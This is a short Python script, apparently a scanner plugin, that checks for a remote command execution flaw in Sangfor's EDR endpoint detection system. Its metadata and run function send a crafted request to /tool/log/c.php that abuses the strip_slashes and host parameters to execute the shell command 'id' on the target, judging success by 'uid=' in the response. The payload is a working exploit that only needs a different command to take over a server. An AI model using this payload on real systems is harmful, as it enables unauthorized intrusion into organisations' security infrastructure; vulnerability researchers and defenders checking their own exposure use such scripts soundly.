#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse

def vuln_info():
    info={
        'name': '深信服EDR终端检测系统RCE',
        'referer':'https://blog.csdn.net/qq_32393893/article/details/108077482',
        'author':'qianxiao996',
        'description':'''漏洞位置：host 参数
https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&host=id'''

    }
    return info
def run(url,timeout):
    bug = '/tool/log/c.php?strip_slashes=system&host=id'
    url = url + bug
    try:
        r = requests.get(url,timeout=timeout)
        if 'uid=' in r.text:
            return ['存在',url]
        else:
            return ['不存在','']
    except:
        return ['不存在','']
    

